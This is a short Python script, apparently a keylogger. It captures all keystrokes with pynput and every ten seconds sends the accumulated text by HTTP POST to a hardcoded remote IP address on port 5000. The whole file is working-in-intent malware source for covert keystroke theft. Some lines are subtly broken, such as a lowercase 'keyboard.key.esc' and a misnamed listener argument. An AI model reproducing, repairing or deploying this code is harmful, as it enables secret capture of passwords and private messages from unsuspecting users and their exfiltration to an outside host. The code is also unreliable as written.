from pynput import keyboard
import requests
import json
import threading

text = ""
ipAddress = "109.74.200.23"
portNumber = "5000"
timeInterval = 10


def sendPostRequest():
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ipAddress}:{portNumber}/keyboard",
                          data=payload, headers={'Content-Type': 'application/json'})
        timer = threading.Timer(timeInterval, sendPostRequest)
        timer.start()
    except:
        print("Internal Error, could not complete request")


def onPress(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(onPress=onPress) as listener:
    sendPostRequest()
    listener.join()
